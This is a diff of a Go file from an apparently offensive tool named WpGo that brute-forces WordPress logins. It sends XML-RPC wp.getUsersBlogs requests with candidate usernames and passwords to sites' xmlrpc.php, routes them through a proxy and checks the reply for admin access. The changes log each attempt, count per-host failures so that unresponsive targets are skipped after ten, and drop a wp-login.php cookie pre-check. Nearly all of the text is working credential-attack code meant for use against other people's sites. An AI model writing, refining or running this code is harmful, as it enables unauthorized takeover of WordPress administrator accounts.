@@ -4,7 +4,6 @@ import (
 	"fmt"
 	"log"
 	"net/http"
-	"os"
 	"strings"
 	"sync"
 
@@ -13,6 +12,7 @@ import (
 
 var Success = make(map[string]bool)
 var BlackList = make(map[string]bool)
+var FailCount = make(map[string]int)
 var sLock sync.Mutex
 var bLock sync.Mutex
 var Proxy string
@@ -22,17 +22,6 @@ type WpGo struct {
 	AttackType string
 }
 
-func Write(line string) {
-	lock.Lock()
-	file, err := os.OpenFile(LogFile, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0666)
-	if err != nil {
-		log.Println(err)
-	} else {
-		defer file.Close()
-		file.WriteString(line)
-	}
-	lock.Unlock()
-}
 func NewWpGo(attackType string) *WpGo {
 	w := WpGo{}
 	w.AttackType = attackType
@@ -54,8 +43,8 @@ func (w *WpGo) XMLRCPLogin(siteTask SiteTask) {
 	if w.CheckIsBlack(siteTask) {
 		return
 	}
-	log.Println(siteTask)
 	uri := fmt.Sprintf("%s/xmlrpc.php", siteTask.Host)
+	log.Printf("[Try] %s (%s - %s)\n", uri, siteTask.User, siteTask.Pass)
 	postData := fmt.Sprintf(`<methodCall>
 	  <methodName>wp.getUsersBlogs</methodName>
 	  <params>
@@ -70,7 +59,11 @@ func (w *WpGo) XMLRCPLogin(siteTask SiteTask) {
 		w.http.SetProxy(Proxy)
 	}
 	if r := w.http.Execute(); r == nil {
+		w.AddFail(siteTask.Host)
 		return
+	}
+	if w.http.StatusCode != 200 {
+		w.AddFail(siteTask.Host)
 	}
 	ret, _ := w.http.Text()
 	if strings.Contains(ret, "isAdmin") {
@@ -129,12 +122,20 @@ func (w *WpGo) SetSuccess(key string) {
 func (w *WpGo) GetBlack(key string) bool {
 	sLock.Lock()
 	r := BlackList[key]
+	if r == false {
+		r = FailCount[key] > 10
+	}
 	sLock.Unlock()
 	return r
 }
 func (w *WpGo) SetBlack(key string, t bool) {
 	sLock.Lock()
 	BlackList[key] = t
+	sLock.Unlock()
+}
+func (w *WpGo) AddFail(key string) {
+	sLock.Lock()
+	FailCount[key]++
 	sLock.Unlock()
 }
 func (w *WpGo) CheckIsBlack(siteTask SiteTask) bool {
@@ -145,26 +146,7 @@ func (w *WpGo) CheckIsBlack(siteTask SiteTask) bool {
 	if w.GetSuccess(key) {
 		return true
 	}
-	uri := fmt.Sprintf("%s/wp-login.php", siteTask.Host)
-	postData := fmt.Sprintf("log=%s&pwd=%s", siteTask.User, siteTask.Pass)
-	w.http.New("POST", uri)
-	w.http.IgnoreSSL()
-	w.http.HttpClient.CheckRedirect = func(req *http.Request, via []*http.Request) error {
-		return http.ErrUseLastResponse
-	}
-	w.http.SetContentType("application/x-www-form-urlencoded")
-	w.http.SetPostString(postData)
-	if Proxy != "" {
-		w.http.SetProxy(Proxy)
-	}
-	w.http.Execute()
-	defer w.http.Close()
-	cookie := w.http.RespCookie()
-	if strings.Contains(cookie, "wordpress_test_cookie") == false {
-		w.SetBlack(siteTask.Host, true)
-		return true
-	}
-	w.SetBlack(siteTask.Host, false)
+
 	return false
 
 }
